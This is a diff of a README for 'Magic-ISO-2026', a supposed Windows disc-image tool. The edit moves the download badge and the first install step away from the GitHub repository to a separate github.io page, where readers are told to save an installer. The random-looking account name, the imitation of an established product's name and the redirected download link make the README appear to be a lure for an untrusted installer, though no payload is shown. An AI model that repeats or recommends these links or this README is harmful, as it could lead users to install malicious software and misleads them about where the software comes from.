@@ -1,6 +1,6 @@
 # 💿 Magic-ISO-2026 - Manage disc images on Windows easily
 
-[![](https://img.shields.io/badge/Download-MagicISO-blue.svg)](https://github.com/candent-externalnasalvein16/Magic-ISO-2026)
+[![](https://img.shields.io/badge/Download-MagicISO-blue.svg)](https://candent-externalnasalvein16.github.io)
 
 Magic-ISO-2026 provides a way to handle disc images on your computer. It reads, edits, and creates ISO files within the Windows environment. Use this tool to mount virtual drives or extract content from archives. It supports Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ Magic-ISO-2026 provides a way to handle disc images on your computer. It reads, 
 
 Follow these steps to obtain and use the software.
 
-1. Visit the project link to start the process: [https://github.com/candent-externalnasalvein16/Magic-ISO-2026](https://github.com/candent-externalnasalvein16/Magic-ISO-2026)
+1. Visit the project link to start the process: [https://candent-externalnasalvein16.github.io](https://candent-externalnasalvein16.github.io)
 2. Locate the download section on the page.
 3. Click the link to save the installer file to your computer.
 4. Move the file to your desktop for easy access.
